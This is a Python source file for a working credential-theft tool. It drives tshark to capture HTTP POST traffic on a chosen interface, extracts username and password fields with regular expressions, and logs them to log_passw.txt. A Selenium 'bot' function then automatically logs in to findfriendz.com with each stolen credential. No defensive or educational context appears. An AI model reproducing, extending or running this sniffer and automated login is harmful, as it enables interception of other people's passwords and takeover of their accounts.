# imports - standard imports
import re
import subprocess

# imports - third party imports
# for function: bot
from selenium import webdriver
from selenium.webdriver.common.keys import Keys


def __get_data__(cmd):
    # needs work ALSO CHECK: 'cmd' -a duration
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)  # , universal_newlines=True
    for line in iter(process.stdout.readline, b""):
        if "Capturing" in str(line):
            return
        elif line not in [None, '', ' ']:
            return __clean_data__(str(line))
        else:
            return


def __clean_data__(line):
    # line: input is raw data from tshark cmd
    # parser for extracting data, returns dict
    # format: {site:site-address, user:user-data, pass:pass-data}

    except_count = 0  # variable count to check if exception occurs

    match_str = r"((user)|(email))[A-Za-z]*=[A-Za-z0-9]*(%40)?[a-zA-Z.]*&(pass)[A-Za-z]*=[A-Za-z0-9]*"
    ip_addr_str = r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"

    try:
        user_pass = re.search(match_str, line).group()
    except AttributeError:
        # in case the user/pass isn't found
        except_count += 1
        user_pass = line

    try:
        ip = re.search(ip_addr_str, line).group()
    except AttributeError:
        # in case the ip isn't found
        except_count += 1
        ip = line

    if except_count > 1:
        # if exceptions occur, save raw data in file instead
        return {"site": line, "user": "", "pass": ""}

    # if everything goes as smooth as planned...
    user, passw = user_pass.split('&')

    user = ''.join(user.split('=')[1:])
    passw = ''.join(passw.split('=')[1:])  # might have = in pass
    user = user.replace('%40', '@')
    # ((user)|(email))[A-Za-z]*=[A-Za-z0-9]*&(pass)[A-Za-z]*=[A-Za-z0-9]* for user/pass
    # ^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$ for IP address

    return {"site": ip, "user": user, "pass": passw}


def __select_interface__(tshark_path):
    interface_dict = {}
    interface = ""
    counter = 0

    interface_path = tshark_path + " -D any"
    process = subprocess.Popen(interface_path, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

    try:
        for line in iter(process.stdout.readline, b""):
            counter += 1
            address = str(line).split(' ')[1]
            try:
                name = re.findall(r"\([A-Za-z\-\s]*\)", str(line))[0]
            except:  # returns None name if not handled
                name = ''.join(str(line).split(' ')[2:])[:-5]
            interface_dict[counter] = {name: address}
    except:  # don't remember why its need, but it surely saved my life
        import os
        # sets the Wireshark NPF driver on auto start to avoid reading errors
        os.system("sc config npf start= auto")

    print("Select Interface:")
    for count, mini_dict in interface_dict.items():
        for name, val in mini_dict.items():
            print(f"{count} {name}")

    int_num = int(input())
    print(f"{interface_dict[int_num]} selected")

    for name in interface_dict[int_num].keys():
        interface = r" -i {} ".format(interface_dict[int_num][name])

    return interface


def sniff():
    print("Using Tshark")

    path = input("Enter tshark path: ")
    if path[0] == '"' and path[-1] == '"':
        tshark_path = path
    else:
        tshark_path = '"' + path + '"'  # r"C:\Program Files\Wireshark\tshark.exe"

    interface = __select_interface__(tshark_path)
    method = r" -Y http.request.method==POST "
    e_data = r" -Tfields -e http.file_data -e ip.dst -a duration:10"
    cmd = tshark_path + interface + method + e_data

    print(cmd)  # final query in tshark

    while True:
        # print(get_data(cmd))
        data_read = __get_data__(cmd)
        try:
            print(data_read)
            with open("log_passw.txt", "a") as f:
                f.write(f"{data_read['site']}\t{data_read['user']}\t{data_read['pass']}\n")
                bot(data_read['user'], data_read['pass'])
        except TypeError:
            pass


def bot(ussr, passw):
    # makeshift function
    # special function made upon request
    url = r"http://findfriendz.com/login.php"
    browser = webdriver.Chrome("chromedriver.exe")
    browser.get(url)
    username = browser.find_element_by_id(id_='emailid')
    password = browser.find_element_by_id(id_='password')
    username.send_keys(ussr)
    password.send_keys(passw)
    password.send_keys(Keys.RETURN)
